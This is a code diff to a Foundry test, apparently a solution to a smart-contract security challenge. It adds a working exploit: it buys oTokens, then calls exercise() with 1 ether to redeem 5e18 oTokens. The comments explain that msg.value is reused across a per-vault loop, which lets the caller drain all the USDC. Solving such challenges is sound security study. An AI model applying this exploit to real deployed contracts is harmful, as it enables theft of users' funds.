@@ -85,8 +85,19 @@ contract Testing is Test {
 
         // implement solution here
         usdc.approve(address(optionsMarket),500e18);
+        //Buy oTokens as much as we can
         optionsMarket.purchase(5e18);
-        uint256 value = optionsContract.underlyingRequiredToExercise(5e18);
+        
+        console.log("amount of oTokens for vault_1 : ", optionsContract.maxOTokensIssuable(2_000e18));
+        //Each vault has 1e18 oTokens and we bought 5e18 oTokens, we are good
+        uint256 value = optionsContract.underlyingRequiredToExercise(1e18);
+        //For 1e18 oTokens exercice we need to send 1 ether
+        value = optionsContract.underlyingRequiredToExercise(5e18);
+        console.log("amount of ether that we need to send : ", value);
+        //For 5e18 oTokens exercice we need to send 5 ether
+        
+        //However exercice() use a loop for exercice the 5e18 oTokens (1e18 per vault), so we can send only 1 ether
+        //With only 1 ether we will exercice 5e18 oTokens and so get all the USDC
         optionsContract.exercise{value : 1 ether}(5e18,addresses);
 
         
